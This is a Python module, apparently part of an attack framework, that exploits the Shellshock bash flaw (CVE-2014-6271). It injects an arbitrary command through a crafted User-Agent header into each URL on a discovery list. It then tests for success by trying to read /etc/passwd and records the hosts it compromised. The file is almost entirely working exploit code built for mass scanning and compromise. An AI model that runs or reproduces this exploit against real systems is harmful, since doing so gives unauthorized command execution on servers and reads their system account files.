# Shellshock Remote Code Execution (CVE-2014-6271)

from leviathan_config import BASE_DIR
from lib.utils import id_generator, discovery_parse, compromise_save
import sys
import urllib2

exploit_name = "shellshock"

def exploit(url, command):
    response = ""
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; ' + command)]
    try:
        response = opener.open(url)
    except:
        pass  
    return response


def action(discovery_id):
    successful_urls = []
    urllist = discovery_parse(discovery_id)
    print urllist
    for url in urllist:
        response = exploit(url, "cat /etc/passwd/")
        try:
            if "root" in response:
                successful_urls.append(url)
                print "Vulnerable! " + url
        except:
            pass
    if successful_urls:        
        compromise_save(discovery_id, exploit_name, successful_urls)

def show_desc():
    return "Shellshock Remote Code Execution (CVE-2014-6271)"
